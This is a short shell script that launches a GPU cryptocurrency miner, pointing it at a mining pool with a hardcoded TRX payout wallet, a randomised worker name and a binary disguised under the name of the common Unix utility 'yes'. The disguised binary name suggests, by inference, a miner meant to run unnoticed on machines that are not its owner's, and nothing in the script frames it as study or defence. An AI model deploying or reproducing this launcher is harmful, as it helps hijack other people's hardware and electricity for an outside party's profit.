POOL=rx-us.unmineable.com:3333
WALLET=TRX:TH5Vc5dN4ZyUHTNPXciz1MRm9rdMF7Aehe
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo 6MsNXvcR-$(shuf -i 1911-760030 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
